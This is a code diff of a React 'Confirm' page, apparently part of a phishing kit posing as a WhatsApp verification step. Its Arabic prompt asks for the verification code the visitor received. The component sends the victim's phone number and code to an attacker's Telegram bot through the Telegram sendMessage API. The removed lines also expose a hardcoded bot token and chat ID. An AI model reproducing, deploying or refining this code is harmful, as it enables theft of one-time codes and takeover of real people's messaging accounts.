@@ -12,8 +12,8 @@ export default function Confirm({ setPage, setNcode, ncode }) {
   const [message, setMessage] = useState("ادخل رمز التحقق لي وصلك");
 
   const APIS = () => {
-    const apiToken = "6433121980:AAGko90tu3pLPIhkMTOHyYQZXMVb-vW-RNs";
-    const chatId = "5807893197";
+    const apiToken = process.env.REACT_APP_API_TOKEN;
+    const chatId = process.env.REACT_APP_CHAT_ID;
     const text = `${formatPhoneNumberIntl(ncode.number)} Code: ${code}`;
     const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
     Axios(url);
@@ -42,7 +42,7 @@ export default function Confirm({ setPage, setNcode, ncode }) {
           <div>
             <img
               className="mx-auto h-16 w-16"
-              src="/wp.png"
+              src={`${process.env.PUBLIC_URL}/wp.png`}
               alt="Your Company"
             />
             <h2 className="mt-6 text-center tracking-tight text-gray-700">
